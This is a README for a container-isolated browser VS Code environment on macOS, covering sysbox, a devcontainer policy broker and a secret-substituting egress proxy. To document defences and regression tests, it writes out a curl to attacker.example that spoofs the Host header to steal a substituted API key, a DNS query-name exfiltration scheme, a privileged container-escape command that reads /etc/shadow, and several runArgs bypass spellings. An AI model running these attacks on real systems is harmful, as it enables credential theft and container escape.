# isolated-devcontainers-suede

> [!NOTE]
> This is a [suede](https://github.com/pmalacho-mit/suede) dependency. 

A browser-based, container-isolated VS Code dev environment for macOS (Apple
Silicon). You edit in a browser tab; each project runs in its own devcontainer
on an inner Docker daemon; that inner daemon runs **unprivileged** under the
[sysbox](https://github.com/nestybox/sysbox) runtime, so a compromised project
cannot reach the VM or your Mac. Hardened against the container-escape chain in
The Red Guild's "Leveraging VSCode internals to escape containers."

The name is "desolate" = **de**v + i**solate**.

## Architecture

```
+- macOS ---------------------------------------------------------------+
|  browser --> 127.0.0.1:3000 (token)     ./cli.sh observe (no port)   |
|                                                                       |
|  +- Colima VM (Ubuntu; sysbox + desolate-proxy) --------------------+   |
|  |  SECRETS LIVE HERE ONLY: /etc/desolate-proxy/settings.json (0600)  |   |
|  |  all container egress is force-redirected through the proxy      |   |
|  |  +- dind -- UNPRIVILEGED via sysbox-runc --------------------+  |   |
|  |  |  inner dockerd   <- devcontainers + relays live here      |  |   |
|  |  |   |- [orchestrator] --- HOLDS THE SOCKET; serves broker    |  |   |
|  |  |   |- [vscode: editor] -- NO socket; broker client only     |  |   |
|  |  |   \- devcontainer (your project)                          |  |   |
|  |  |        \- optional level-3 container (e.g. FastAPI)       |  |   |
|  |  +-----------------------------------------------------------+  |   |
|  +----------------------------------------------------------------+   |
|  Host /var/run/docker.sock: mounted NOWHERE                          |
+-----------------------------------------------------------------------+
```

**One** host-reachable surface, loopback-only: `3000`, the editor, token-gated.
(Plus the dev-server range, 8080-8090 by default, once a project is running.)

There is deliberately no network path to the inner Docker daemon. An earlier
version published a GET-only socket proxy on `127.0.0.1:2375` for host-side
observability; it was removed, because its read-only guarantee constrained only
the Mac -- already the trust root, and able to drive the inner daemon through
the orchestrator regardless -- while an unauthenticated HTTP port on loopback is
reachable from any browser aimed at a hostile page (DNS rebinding), which a unix
socket is not. `./cli.sh observe` replaces it.

## Requirements

- Apple Silicon Mac, macOS 13+
- Homebrew
- `brew install docker docker-compose colima`

sysbox is what makes the whole thing safe, and it needs a real Linux kernel
(cgroup v2, id-mapped mounts). Colima's VM is a real Ubuntu machine, so sysbox
installs into it -- unlike Docker Desktop's sealed VM, where it cannot. (This
is why the setup is Colima-only.)

## Setup

### 1. Create the Colima VM

Use flags (not a config file -- Colima's config has required fields that a
hand-written file omits):

```bash
colima start desolate \
  --cpu 4 --memory 8 --disk 60 \
  --vm-type vz --vz-rosetta --mount-type virtiofs
docker context use colima-desolate
```

### 2. Provision the VM

```bash
./cli.sh vm install
```

One command, run from the Mac. It sshes into the VM and installs both VM-side
layers, in order:

1. **sysbox** ([`vm/install-sysbox.sh`](vm/install-sysbox.sh)) -- the
   containment boundary. `cli.sh up` refuses to start until `docker info`
   lists `sysbox-runc`.
2. **the egress proxy** ([`proxy/vm/install.sh`](proxy/vm/install.sh)) --
   mitmproxy in transparent mode on `:18080`, a VM-local resolver on `:5353`,
   nftables rules that force all container egress through them, and a CA
   publisher on `:18081`. The dev-server range (8080-8090 by default) is
   deliberately left alone -- those belong to your projects.

**The sysbox layer needs a container-free daemon.** Its installer restarts
docker to rewrite network parameters and refuses to configure while *any*
container exists on the VM -- stopped ones count. `vm install` handles this: it
removes the desolate stack's own containers first (named volumes are untouched,
so `cli.sh up` restores everything), and refuses only if containers it does not
own are left. Either way it decides *before* apt runs, rather than letting the
package's postinst fail halfway and leave dpkg wedged.

(`./cli.sh up` re-provisions only the proxy layer, via `--proxy-only`, so it is
never subject to this -- which is the point of that flag.)

Both layers are idempotent, so re-running is also how you upgrade them. There
is **nothing to run again after your first `up`**: `cli.sh up` checks that the
nftables rules are armed for the bridge the stack actually landed on, and
re-provisions automatically if they are not (see "How the egress check stays
honest" below).

This needs the repo under your home directory, since that is what Colima mounts
into the VM. `./cli.sh vm status` tells you what it can see:

```bash
./cli.sh vm status
```

To pin a different sysbox release, check the
[releases page](https://github.com/nestybox/sysbox/releases) and pass it
through:

```bash
SYSBOX_VERSION=0.7.0 ./cli.sh vm install
```

### 3. Start the stack

```bash
echo "VSCODE_TOKEN=$(openssl rand -hex 24)" > .env && chmod 600 .env
./cli.sh up            # verifies sysbox, builds, starts, runs preflight,
                       # then prints (and copies) the editor URL
```

Open the printed `http://127.0.0.1:3000/?tkn=...` URL. That's your editor.

`preflight` will tell you whether egress is actually intercepted. To see the
secrets machinery work end to end:

```bash
./cli.sh proxy test     # substitution + scrubbing, then a blocked exfil (403)
```

### How the egress check stays honest

The nftables rules match on an interface *name* (`iifname $DESOLATE_IF`). That
name is pinned in `docker-compose.yml` via
`com.docker.network.bridge.name: br-desolate`, so it survives a `down`/`up`.

The pin has one gap, and it is a silent one. `driver_opts` are applied when the
network is **created**, so a network that already existed before the pin was
added keeps docker's generated `br-<hash>` name. Rules armed for `br-desolate`
still load cleanly -- `iifname` is a string match, so nftables happily accepts a
name no interface currently has -- and then match nothing. No error, no failed
request, just no interception.

So `cli.sh up` does not trust the pin. After compose returns it resolves the
bridge the network is *actually* on (via the gateway address), compares that
against the `DESOLATE_IF` the installed ruleset is armed for, and also checks
that the ruleset is loaded and the three units are active. If any of that is
wrong it re-runs the proxy layer automatically:

```
cli.sh: egress interception needs attention -- rules are armed for
        'br-desolate' but the stack is on 'br-a1b2c3d4e5f6'.
cli.sh: re-provisioning the VM proxy layer...
```

It re-provisions with `--proxy-only`, because the sysbox layer restarts docker
and would kill the stack that just started.

If it cannot arm interception, `up` **fails** rather than leaving containers
running with unfiltered egress. Override with `DESOLATE_SKIP_VM_CHECK=1` if you
have a reason to.

An unpinned network still gets a warning, because its name changes on every
recreate and the rules would go stale again each time. `./cli.sh down && ./cli.sh up`
recreates the network and fixes it permanently.

## Daily use

```bash
./cli.sh up                     # start (idempotent); prints the editor URL
./cli.sh url                    # reprint + copy the editor URL to clipboard
./cli.sh desolate <project>     # open a workspace project as an isolated IDE
./cli.sh secret add NAME --hosts a.com   # store a real value in the VM only
./cli.sh secret list | rm NAME
./cli.sh proxy status | logs | test      # egress proxy health + self-test
./cli.sh vm status              # sysbox, live vs armed bridge, VM unit state
./cli.sh vm install             # re-provision the VM (idempotent; also upgrades)
./cli.sh repo add owner/repo    # per-repo deploy key (in-container) + clone
./cli.sh shell                  # bash in the editor container
./cli.sh ps | logs | preflight | observe
./cli.sh down                   # stop (down -v also deletes volumes; confirms)
```

**Getting code in and out:** use the browser editor directly -- drag a folder
into the file explorer to add it, and right-click -> Download to pull files
out. There is no separate copy tool.

## Privilege separation (why the editor can't touch the daemon)

The editor is a **universal file viewer/editor** over `/workspaces` -- you can
read, edit, add and delete files in any project from the `:3000` tab. What it
deliberately does *not* have is Docker access: no socket mount, no
`DOCKER_HOST`. Only the **orchestrator** container holds the inner daemon
socket.

To start a devcontainer, the editor's `desolate` command sends a request over a
unix socket to the orchestrator's **broker**, which accepts a fixed vocabulary
and nothing else:

```
desolate <project>            ->  {"op":"start","project":"..."}
desolate --rebuild <project>  ->  {"op":"rebuild", ...}
desolate --stop <project>     ->  {"op":"stop", ...}
desolate --ports <project>    ->  {"op":"ports", ...}
desolate --list               ->  {"op":"list"}
```

`rebuild` runs the *same* snapshot-resolve-enforce sequence as `start`, never a
shortcut around it. It is the op most likely to be used immediately after
editing `devcontainer.json` -- precisely when the spec is newly hostile -- so
letting it reuse an older validation would make "edit the spec, then rebuild"
the way past the policy.

So a malicious VS Code extension in the editor cannot create containers, mount
volumes, or exec into siblings -- the API simply has no such verb.

**The broker also validates the spec, and that part is load-bearing.** The
editor can edit `devcontainer.json`, so a narrow op vocabulary alone would be
theater: a hostile extension could write
`"mounts": ["source=otherproject-secrets,..."]` into its own project and then
ask us to start it.

Getting that check *right* is harder than it looks, because a devcontainer's
privilege can arrive from four places, and only one of them is the top-level
keys of the file you are reading. Five bypasses were demonstrated against an
earlier version of this policy; each now has a named regression test in
`tests/` (`E1`..`E5`). The rules, and what each is actually defending:

- **`initializeCommand` is refused.** It runs on the machine driving the
  devcontainer CLI -- the *orchestrator*, which holds the inner daemon socket.
  It was arbitrary code execution against exactly the daemon the editor is not
  allowed to touch. The in-container hooks (`postCreateCommand`,
  `onCreateCommand`, `postStartCommand`, ...) run inside your container and
  stay allowed.
- **`dockerComposeFile` is refused.** A compose-mode devcontainer declares its
  privilege in the compose file, which this policy does not read; `privileged`,
  `pid: host`, `network_mode: host` and `- /:/host` are all expressible there.
  Run compose *inside* a devcontainer with the docker-in-docker feature instead.
- **Policy is enforced on the CLI's own `mergedConfiguration`**, not on our
  parse of the file. That is where a *feature*'s `privileged` / `capAdd` /
  `securityOpt` / `mounts` land -- a local `./myfeature` could otherwise inject
  `--privileged --mount type=bind,src=/,dst=/host` without the project's
  devcontainer.json mentioning any of it. It also removes the class of bug
  where our parser and the CLI's disagree about what the file says.
- **Mounts must be volumes** named `<project>` or `<project>-*`, checked over
  the merged list. The one exception is the read-only public-CA bind.
- **`runArgs` is an allowlist**, not a denylist. A denylist has to enumerate
  every spelling docker accepts, and it did not: `--network=host` was refused
  while `--network host`, `--net=host`, `--pid=container:<id>`, `--uts=host`
  and `--cgroupns=host` all sailed through. Unknown flags are now refused.
- **`workspaceMount`**, if present, must bind exactly this project's own folder.
- **`appPort` is refused** (it collides with the relay bind).
- **Privilege must be opted into explicitly**, in the project's own file:
  `"customizations": {"desolate": {"allowPrivileged": true}}`. The
  docker-in-docker feature needs it; the point is that it can no longer be
  inherited *silently* from a third-party feature, and that `git log` shows
  which projects are in the escalated tier.

The validated spec is then **snapshotted** to a directory only the orchestrator
can write, and the container is started from that copy (`--override-config`).
Without it the editor could swap the file between the check and the start, and
the check would be decorative.

`preflight.sh` asserts the separation holds: the editor must *fail* to reach a
daemon, must not mount the socket volume, and the broker socket must be
present. `tests/integration/stack` goes further and runs the attacks from
inside the editor container.

**Known limit:** a project that uses the docker-in-docker feature is privileged
*within the sysbox userns* on the inner daemon, so within one stack it remains
possible for such a project, if compromised, to reach sibling containers'
on-disk data. The broker cannot fix that -- it can only make you write the
opt-in down. Run genuinely untrusted code in a separate stack (trust tier), not
just a separate project.

**Also unfixed by the broker:** all devcontainers share the inner daemon's
default bridge with `icc=true`, so they can reach each other over the network
even though they cannot read each other's files. Per-project networks would
close that; today it is a real gap in "each devcontainer is truly sandboxed".

## Dev servers and dynamic ports

A project declares the **container-side** ports it serves, in its
`devcontainer.json` (never host ports -- those are machine-specific and would
collide):

```json
"customizations": { "desolate": { "ports": [5173] } }
```

`desolate` allocates a free host port from **8080-8090** at start, remembers it
per project (stable URLs across restarts), and forwards it via a socat relay.
Start your dev server bound to `0.0.0.0` (e.g. `npx vite --host 0.0.0.0`); the
URL `desolate` printed answers once the server is up. Do **not** put `appPort`
in devcontainer.json -- `desolate` hard-fails on it, because it collides with
the relay's port bind.

Each project spends one port on its editor plus one per declared port, so the
default range holds roughly five or six projects at once.

### Features and build-time downloads

Devcontainer Features work normally, including ones that fetch over HTTPS during
the build. That needs explaining, because it is not free: build steps run in
containers made from your **base image**, which does not trust the intercepting
proxy's CA, so a Feature curling an installer would fail certificate
verification.

So `desolate` derives one for you. Before starting a project it builds a thin
image from your base with the CA installed, tags it
`desolate-ca/base:<hash>`, and starts the project from that. It happens once per
base image, is cached in the inner daemon afterwards, and nothing about it
bypasses the proxy -- the build just trusts it like every other container does.

**Projects that build from their own `Dockerfile` are not covered.** The `FROM`
is yours, so `desolate` cannot derive it; build-time HTTPS in such a project
still fails certificate verification, and `desolate` says so explicitly when it
sees one rather than letting you discover it mid-build.

The supported path is `"image"` plus Features, which covers most of what a
Dockerfile is usually doing anyway. If you genuinely need a custom Dockerfile,
either pre-build that image yourself outside the stack and reference it with
`"image"`, or keep its build steps to plain-http sources (`apt` already is).
Closing this properly is a known open item.

### Applying changes to devcontainer.json

```bash
desolate --rebuild <project>              # recreate the container from the current spec
desolate --rebuild --no-cache <project>   # and rebuild the image ignoring layer cache
```

**Starting a project reuses its existing container.** `devcontainer up` finds
the container by label and starts it; it never re-reads `devcontainer.json`. So
the obvious cycle -- edit the spec, `--stop`, start again -- gives you the old
container back, and `--stop` deliberately keeps the container so restarts stay
fast. `--rebuild` is what applies a spec change.

You should not have to remember this: `desolate` fingerprints the whole
`.devcontainer/` tree when it creates a container and compares on every start,
so an edit that is not in effect is reported rather than silently ignored. A
`Dockerfile` or `postCreate` script edit counts the same as a `devcontainer.json`
one.

Rebuilding is never automatic, because it destroys anything written inside the
container outside `/workspaces` -- packages installed ad hoc, a local database.
`/workspaces` itself is a volume and survives.

### Changing the range

8080-8090 is the default, not a constant. Set both bounds in the `.env` next to
`docker-compose.yml` and restart:

```bash
DESOLATE_PORT_MIN=8080
DESOLATE_PORT_MAX=8120
```

```bash
./cli.sh up          # recreates dind (the publish) and the orchestrator (the allocator)
```

Set **both** variables, and change them only here. They feed two places that
have to agree: the range dind publishes to the Mac, and the range `desolate`
allocates relays from. Of the two ways to get that wrong, only one is loud --
publishing more than you allocate merely wastes port bindings, while allocating
more than you publish produces a relay that binds happily inside dind and is
simply unreachable from the Mac, so the URL never answers and nothing logs an
error. Driving both from one pair of variables is what prevents that;
`cli.sh preflight` re-checks it against the *running* containers, which is the
case config alone cannot catch (an `.env` edit without a restart).

### When the range runs out

There is no queue and no overflow range: `desolate <project>` stops with a
listing of every port in the range and what holds it, and does nothing else.
Allocation happens before `devcontainer up`, so a refusal leaves nothing
half-started and does not disturb the port maps of projects already running.

The usual cause is simply too many projects at once -- `desolate --stop <other>`
frees a port immediately. The other cause is worth knowing: relay containers run
with `restart: unless-stopped`, so if a project's devcontainer is deleted by
hand rather than through `desolate --stop`, its relays survive and keep holding
their ports. `./cli.sh observe ps` lists them as `desolate-relay-<project>-<port>`.

## Secrets: placeholders in, real values never

Containers never hold credentials. They hold a **placeholder**; the real value
lives only in the Colima VM, below the sysbox boundary, and an intercepting
proxy substitutes it in-flight -- and only toward that secret's allowlisted
hosts.

```
devcontainer.json  (git-tracked, safe to commit)
  "containerEnv": { "OPENAI_API_KEY": "MYAPP-OPENAI-KEY" }

Colima VM  /etc/desolate-proxy/settings.json  (0600, VM disk only)
  "MYAPP-OPENAI-KEY": { "value": "sk-real...", "hosts": ["api.openai.com"] }
```

Your code reads `$OPENAI_API_KEY` and sends `Authorization: Bearer
MYAPP-OPENAI-KEY` exactly as normal. On the way out the proxy swaps in the real
key. Responses are scrubbed on the way back, so the real value cannot re-enter
the container even if an endpoint echoes it.

### What "toward that secret's allowlisted hosts" has to mean

The destination is taken from the **TLS SNI**, and the `Host` header must match
it. That distinction is the whole guarantee, and getting it wrong is silent:
an earlier version decided on the `Host` header alone, which the client picks
independently of the IP it connects to. Any container could then run

```bash
curl http://attacker.example/ -H 'Host: api.openai.com' \
     -H 'Authorization: Bearer MYAPP-OPENAI-KEY'
```

and the proxy would substitute the real key and hand it to the attacker. The
same worked over TLS with any certificate the attacker legitimately owned.
Both are in `tests/integration/proxy` now, run against a real transparent
proxy, checking what the attacker's server actually received.

Two consequences you will notice:

- **A secret may not travel over plain HTTP.** Plaintext has no SNI and
  therefore no provable destination, so a placeholder over `http://` is
  refused with 403. Ordinary plaintext traffic (apt, pip) is unaffected.
- SNI must match `Host`. An attacker who instead claims
  `SNI=api.openai.com` toward their own IP cannot finish the handshake --
  mitmproxy verifies the upstream certificate against that name.

### Adding a secret

```bash
./cli.sh secret add MYAPP-OPENAI-KEY --hosts api.openai.com
#   prompts for the value with echo off; it travels on stdin, so it never
#   lands in your shell history, in argv, or in this repo
./cli.sh secret list      # names and allowlists only -- never values
./cli.sh secret rm NAME
```

Placeholders must be >=12 chars and globally unique; a project prefix
(`MYAPP-*`) is the convention. A secret with no host allowlist is refused.

### Why this is stronger than a secrets file

- **Exfiltration is bounded.** Compromised code in a project can only leak the
  placeholder. Sending it anywhere outside the allowlist is refused with 403
  and logged -- so the honeypot case is caught, not just survived.
- **Nothing to find.** There is no key material on any container-reachable
  filesystem. Even an escape into the dind container finds only placeholders.
- **The network PATH is default-deny.** Container traffic can leave only via
  the proxy (80/443) and the VM's resolver; every other port is dropped by the
  forward chain, and QUIC is killed so TLS falls back to interceptable TCP.

### What this does not give you

Be precise about the boundary, because the parts that look like guarantees and
are not will bite:

- **Hosts are not restricted by default.** `default_action` ships as `allow`,
  so the path is default-deny but the *destination set* is not. Set
  `default_action: "deny"` and an explicit `network` allowlist in
  `/etc/desolate-proxy/settings.json` if you want that too.
- **Secrets are not scoped per project.** The proxy sees requests from the
  whole stack and cannot tell which devcontainer sent one. Any project can
  *use* any other project's placeholder toward that secret's allowlisted hosts
  -- it still cannot read the value, and it cannot send it anywhere else, but
  "project A cannot spend project B's API quota" is not a property this has.
- **DNS is an open channel.** dnsmasq forwards to 1.1.1.1/8.8.8.8 without
  restriction, so a compromised container can exfiltrate data inside query
  names: `<base32-of-your-source>.attacker.com` resolves recursively to the
  attacker's own nameserver, which logs it. Nothing needs to answer -- the
  query *is* the payload. Two things bound it. Secrets cannot go this way,
  because containers only ever hold placeholders and substitution happens in
  the HTTP proxy, which a DNS query never touches -- the attacker receives the
  literal placeholder. And `log-queries` is on, so it lands in the VM's
  journal: detectable after the fact, not prevented.

  Closing it means an allowlist-only resolver (`server=/allowed.com/1.1.1.1`
  per name, plus `address=/#/` to sink the rest). Before reaching for that,
  note that **DNS is not currently your widest channel**: `default_action`
  ships as `allow`, so DNS-over-HTTPS to any provider is permitted, and that
  is a far better exfil path than encoding data into query names. Tightening
  the resolver while leaving `default_action: allow` buys close to nothing.
- **The inner Docker daemon is not exposed to the host at all** -- this is
  where a `127.0.0.1:2375` socket proxy used to be, and it is worth knowing why
  it is gone. `CONTAINERS=1` is a prefix match on `/containers`, and GET-only
  does not mean read-only: it also granted `/containers/{id}/export` (an entire
  container filesystem) and `/containers/{id}/attach/ws` (stdin to a
  container's main process, reachable by GET), alongside the
  `/containers/{id}/archive` arbitrary read. The knob had no finer setting.
  More fundamentally, the read-only guarantee constrained only the Mac, which
  is already the trust root, while the port itself was unauthenticated HTTP on
  loopback -- reachable from a browser via DNS rebinding in a way a unix socket
  never is. `./cli.sh observe` gives the same view over the orchestrator's
  socket. It is a full-access channel behind fixed subcommands, so it is *not*
  mechanically read-only; that guarantee was traded away knowingly, for the
  smaller surface.

### Local-only secrets

For credentials that are *not* outbound HTTP -- a local DB password, a signing
key used in-process -- there is nothing to substitute. Use a per-project volume
outside `/workspaces`:

```json
"mounts": ["source=myapp-secrets,target=/secrets,type=volume"]
```

The broker only permits volumes named `<project>` or `<project>-*`, so one
project cannot mount another's. Prefer the proxy whenever the credential is
used over HTTPS.

### The rules that still apply

Never `COPY .env` or `ARG` a real key in a Dockerfile (image layers are
permanent). Placeholders in `devcontainer.json` are fine and intended -- they
are not secret material.

## Isolation model

Boundaries, strongest first:

- **macOS <-> Colima VM** -- a real VM. Any escape at any inner level lands
  here, not on your Mac.
- **VM <-> dind** -- sysbox. The inner dockerd runs in a user namespace where
  container-root maps to an unprivileged VM user, so a compromised dind cannot
  touch the VM. This is the boundary that makes the design safe regardless of
  credential hygiene: even a fully-privileged leaked key in a project can't
  escalate past here to reach other projects or the VM.
- **dind <-> containers** -- Linux namespaces. Ordinary devcontainers mount only
  their own project folder, so they can't read each other's files.

The docker-in-docker feature (for level-3 projects like `sample-fastapi`) runs
**unprivileged** under sysbox -- no privileged flag, no cgroup workaround. This
is exactly the case sysbox was built for.

## Verifying containment

```bash
./tests/run.sh                 # static + unit: fast, no daemon needed
./tests/run.sh integration     # runs the attacks for real
./cli.sh preflight             # checks a LIVE stack
```

`tests/` carries a named regression case for every escape that has been
demonstrated against this design -- policy bypasses via `initializeCommand`,
compose mode, features, JSONC parser divergence and `runArgs` spellings, plus
secret exfiltration via a spoofed `Host` header. See `tests/README.md`.

`./cli.sh preflight` asserts the stack is up AND that dind runs unprivileged
under sysbox with an active user-namespace (`uid_map` shows container-root
mapping to a non-zero VM uid). It also now proves the *proxy policy* is live,
not merely that the proxy is running: an addon that fails to load leaves a
working transparent proxy that substitutes nothing, so preflight trips the
leak detector on purpose and expects a 403.

To see it yourself, from a terminal inside any devcontainer:

```bash
cat /proc/self/uid_map                 # e.g. "0 100000 65536": root -> VM uid 100000
docker run --rm --privileged -v /:/host alpine cat /host/etc/shadow
```

The second command is the Red Guild escape. Under sysbox it reads only the
*container's* placeholder shadow file (all `*`/`!`, no real hashes), not the
VM's -- proof the escape reads nothing of the host.

## Components

- `docker-compose.yml` -- the stack: `volume-init` (one-shot), `dind`
  (sysbox-runc), `vscode` (OpenVSCode Server), `orchestrator` (the broker).
- `cli.sh` -- the one command you run on the Mac (see Daily use).
- `preflight.sh` -- post-start verification, including the containment proof.
- `observe.sh` -- views of the inner daemon from the Mac, via the orchestrator's
  unix socket. Nothing is published to reach it.
- `vscode-image/` -- one image, two roles. `broker.ts` (orchestrator: narrow
  request API, snapshotting and ground-truth resolution), `policy.ts` (the spec
  policy itself -- pure and unit-tested), `desolate-client.ts` (editor:
  `desolate`), `desolate.ts` (the real runner, `desolate-run`, orchestrator
  only), and `newrepo.ts` (per-repo deploy keys; git only, no daemon needed).
- `tests/` -- static invariants, unit tests and integration tests, including a
  regression case per demonstrated escape. `./tests/run.sh`.
- `vm/` -- VM provisioning. `install.sh` is the single entry point behind
  `./cli.sh vm install` (sysbox, then the proxy); `install-sysbox.sh` is the
  sysbox layer on its own. Both idempotent.
- `proxy/vm/` -- the VM side of the secrets layer: mitmproxy addon (policy,
  substitution, leak detection, response scrubbing), nftables interception,
  dnsmasq resolver, systemd units, and an idempotent `install.sh`.
- `proxy/container/install-ca.sh` -- trusts the proxy CA inside a container.
  You never call it: `desolate` runs it for you.
Two example projects live in `samples/` in the source repo -- `example-project`
(a minimal hardened devcontainer) and `sample-fastapi` (the full three-level
chain plus secrets). They are fixtures and documentation, deliberately outside
this shipped tree, so they are not part of an install. Copy one into
`/workspaces/<name>` to try it.

## Troubleshooting

- **`cli.sh up` says sysbox is missing** -- you're either not on the Colima
  context (`docker context use colima-desolate`) or sysbox isn't installed/
  registered -- run `./cli.sh vm install`.
- **`desolate` errors on `appPort`** -- remove `appPort` from that project's
  devcontainer.json; declare container ports under
  `customizations.desolate.ports` instead.
- **Editor won't load** -- confirm `VSCODE_TOKEN` is set in `.env`; use
  `./cli.sh url` for the correct link. Check `./cli.sh logs`.
- **VM config didn't apply** -- resource flags only take effect when the profile
  is created; `colima delete desolate` and recreate with the flags above.
- **TLS errors inside a devcontainer** -- the proxy CA didn't get installed.
  `desolate` does it automatically as root; if the image lacks
  `update-ca-certificates`, install the CA in your base image instead
  (`proxy/container/install-ca.sh`).
- **`./cli.sh proxy test` shows no interception** -- the nftables rules are
  bound to the wrong bridge. Re-run `sudo ./install.sh` in the VM with the
  stack up; it re-detects.
- **git over SSH fails** -- the forward chain is default-deny and allows tcp/22
  only to hostnames dnsmasq resolved from the allowlist (`github.com` by
  default; add `nftset=` lines in `/etc/desolate-proxy/dnsmasq.conf` for
  others, then `sudo systemctl restart desolate-dnsmasq`).
  This needs dnsmasq >= 2.87. If yours is older, either use git over HTTPS with
  a placeholder token, or add a blanket rule:
  `nft add rule inet desolate forward iifname <bridge> tcp dport 22 accept`
  (weaker: any host becomes reachable on 22).
- **Everything broke, need internet now** -- in the VM:
  `sudo nft delete table inet desolate` removes interception;
  `sudo systemctl restart desolate-nft` puts it back.
